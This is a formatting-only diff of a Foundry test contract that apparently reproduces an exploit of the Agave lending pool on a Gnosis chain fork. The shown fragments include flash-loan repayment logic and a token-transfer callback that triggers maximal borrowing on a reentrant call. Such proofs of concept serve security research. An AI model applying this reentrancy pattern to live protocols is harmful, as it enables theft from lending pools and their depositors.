@@ -4,7 +4,6 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "./interface.sol";
 
-
 interface IWeth is IERC20 {
     function deposit() external payable;
     function mint(address, uint256) external returns (bool);
@@ -84,7 +83,6 @@ contract AgaveExploit is Test {
         return a < b ? a : b;
     }
 
-
     function setUp() public {
         vm.createSelectFork("gnosis", 21_120_283); //fork gnosis at block number 21120319
         providerAddrs = ILendingPoolAddressesProvider(0xA91B9095eFa6C0568467562032202108e49c9Ef8);
@@ -105,7 +103,7 @@ contract AgaveExploit is Test {
         LINK.approve(address(lendingPool), type(uint256).max);
         WETH.approve(address(lendingPool), type(uint256).max);
     }
-    
+
     function getAvailableLiquidity(address asset) internal view returns (uint256 reserveTokenbal) {
         DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
         reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
@@ -154,7 +152,6 @@ contract AgaveExploit is Test {
         console.log("WBTC Balance %d", _logTokenBal(wbtc));
         console.log("healthf : %d", getHealthFactor());
         console.log("--- End of balances --- ");
-
     }
 
     function testExploit() public {
@@ -191,13 +188,13 @@ contract AgaveExploit is Test {
         uint256 amountRepay = ((amountToken * 1000) / 997) + 1;
         uint256 wethbal = WETH.balanceOf(address(this));
         uint256 remainingeth = wethbal > totalBorrowed ? 0 : totalBorrowed - wethbal;
-         if(wethbal < totalBorrowed  ) {
-            console.log('Remaining eth is %d',totalBorrowed - wethbal);
+        if (wethbal < totalBorrowed) {
+            console.log("Remaining eth is %d", totalBorrowed - wethbal);
         }
-        require(amountRepay < WETH.balanceOf(address(this)),'not enough eth');
+        require(amountRepay < WETH.balanceOf(address(this)), "not enough eth");
         //For test case we just send it to address(1) to reduce the flashloan amount from us to get final assets
         WETH.transfer(address(1), amountRepay);
-        console.log("Repay Flashloan for : %s WETH", amountRepay/1e18);
+        console.log("Repay Flashloan for : %s WETH", amountRepay / 1e18);
     }
 
     function getMaxBorrow(address asset, uint256 depositedamt) public view returns (uint256) {
@@ -269,7 +266,7 @@ contract AgaveExploit is Test {
         if (_from == aweth && _value == 1) {
             calcount++;
         }
-          if (calcount == 2 && _from == aweth && _value == 1) {
+        if (calcount == 2 && _from == aweth && _value == 1) {
             borrowMaxtokens();
         }
     }
